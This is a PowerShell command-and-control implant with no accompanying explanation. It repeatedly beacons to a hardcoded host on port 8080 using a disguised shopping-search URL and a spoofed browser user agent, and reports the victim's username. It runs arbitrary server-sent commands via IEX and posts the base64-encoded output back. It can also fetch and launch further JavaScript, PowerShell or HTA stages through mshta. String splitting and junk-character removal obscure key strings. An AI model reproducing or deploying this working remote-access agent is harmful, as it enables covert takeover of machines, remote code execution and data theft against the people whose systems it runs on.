$h0 = "10.0."
$me = "2.4"
$p0rt= "8080"
$uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
$proto = "ht"+"tp"+":/"+"/"
$url = $proto+$h0+$me+":"+$p0rt
$h0me = $url+$uri

$type = "ps1"
$id = Get-Random
$un = $env:username
$sleepytime = 3000
$jsObject = @{}

$useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
$checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`"}"

function ConvertTo-Hashtable {
  [CmdletBinding()]
  [OutputType('hashtable')]
  param (
    [Parameter(ValueFromPipeline)]
     $InputObject
  )

  process {
    if ($null -eq $InputObject) {
      return $null
    }
    if ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
      $collection = @(
        foreach ($object in $InputObject) {
          ConvertTo-Hashtable -InputObject $object
        }
      )

      Write-Output -NoEnumerate $collection
    }

    elseif ($InputObject -is [psobject]) {
      $hash = @{}
      foreach ($property in $InputObject.PSObject.Properties) {
        $hash[$property.Name] = ConvertTo-Hashtable -InputObject $property.Value
      }
      $hash
    }
    else {
      $InputObject
    }
  }
}

while ($True) {
	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
  $jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable

	if($jsObject['cmnd']) {
		if($jsObject['cmnd'] -eq "quit") {
			exit
		}

		elseif($jsObject['cmnd'].StartsWith("spawn")) {
			try {
        if($jsObject['cmnd'] -eq "spawn js") {
				  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn js`"}"
				  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
          $selfpath = "$env:temp\$id.js"
          Set-Content -Path "$selfpath" -Value "$selfdata"
				  Start-Process "$selfpath"
        }
        elseif($jsObject['cmnd'] -eq "spawn hta") {
          Start-Process "xmxsxhxtxax".replace("x","") -ArgumentList "$url/r/b.hta"
        }
        else {
				  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn ps1`"}"
				  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
				  $selfdata = $selfdata.replace('"','"""')
				  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
        }
				$retval = "[+] Spawn success..."
			}
			catch {
				$retval = "[-] Spawn failed..."
			}
		}

		else {
			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
			if($err) {
				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
				$err = ""
			}
		}
		if(!($retval)) {
			$retval = "[-] No results returned"
		}

    $jsObject.cmnd = ""
		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($retval))
		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
	}
	Start-Sleep -Milliseconds $sleepytime
}
